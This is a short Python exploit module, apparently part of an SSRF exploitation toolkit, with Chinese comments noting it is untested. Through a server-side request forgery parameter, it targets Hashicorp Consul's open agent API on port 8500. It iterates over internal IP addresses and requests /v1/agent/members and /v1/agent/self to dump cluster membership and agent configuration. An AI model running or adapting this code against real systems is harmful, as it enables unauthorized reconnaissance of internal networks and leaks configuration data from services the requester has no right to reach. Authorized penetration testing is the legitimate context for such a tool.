import json
import logging
import urllib.parse

from core.utils import *

# 注意：尚未测试
# 可能需要做一些修改才能正常工作！

name = "consul"
description = "Hashicorp Consul 信息泄露 - 开放 API"
author = "Swissky"
documentation = ["https://www.consul.io/api/agent.html"]


class exploit:
    def __init__(self, requester, args):
        logging.info(f"模块 '{name}' 已启动！")
        gen_host = gen_ip_list("127.0.0.1", args.level)
        port = "8500"

        # 列出成员
        for ip in gen_host:
            data = "/v1/agent/members"
            payload = wrapper_http(data, ip, port)
            r = requester.do_request(args.param, payload)

            if r.json:
                print(r.json)

        # 读取配置
        for ip in gen_host:
            data = "/v1/agent/self"
            payload = wrapper_http(data, ip, port)
            r = requester.do_request(args.param, payload)

            if r.json:
                print(r.json)
